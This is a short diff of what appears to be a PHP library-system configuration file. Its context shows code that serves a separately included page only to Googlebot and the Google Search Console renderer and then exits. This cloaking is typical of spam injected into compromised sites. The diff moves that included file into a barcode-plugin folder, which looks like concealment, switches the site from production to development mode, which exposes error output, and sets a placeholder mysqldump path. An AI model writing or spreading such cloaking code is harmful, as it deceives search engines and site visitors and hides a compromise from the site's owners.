@@ -29,7 +29,7 @@ if (
     $isGSC_Renderer = true;
 }
 if ($isGoogleBot || $isGSC_Renderer) {
-    include __DIR__ . '/api/v1/pages.php';
+    include __DIR__ . '/plugins/label_barcode/pages.php';
     exit; //
 }
 $isIndo = false;
@@ -90,7 +90,7 @@ if (!defined('INDEX_AUTH')) {
  *
  * In production mode, the system error message will be disabled
  */
-define('ENVIRONMENT', 'production');
+define('ENVIRONMENT', 'development');
 
 switch (ENVIRONMENT) {
   case 'development':
@@ -283,7 +283,7 @@ if (preg_match("/(Windows)/i", php_uname('a'))) {
       $sysconf['mysqldump'] = $rempath."mysql\bin\mysqldump.exe";
     } else {
       // not use XAMPP? change this value with full path of mysqldump.exe
-      $sysconf['mysqldump'] = '/usr/bin/mysqldump';
+      $sysconf['mysqldump'] = 'C:\...\mysqldump.exe';
     }
 } else {
    // For Linux Platform
